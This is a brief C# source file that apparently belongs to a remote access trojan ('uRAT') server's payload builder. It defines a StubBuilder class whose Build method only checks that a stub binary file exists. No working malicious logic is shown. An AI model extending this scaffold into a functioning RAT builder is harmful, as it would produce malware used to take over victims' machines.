using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;
using uRAT.Server.Builder.Exceptions;

namespace uRAT.Server.Builder
{
    internal class StubBuilder
    {
        private BuildSettings _settings;

        public StubBuilder(BuildSettings settings)
        {
            _settings = settings;
        }

        public void Build(string filename)
        {
            if (!File.Exists("resources\\builder\\stub.bin"))
                throw new ComponentMissingException("Failed to locate stub file");
        }
    }
}
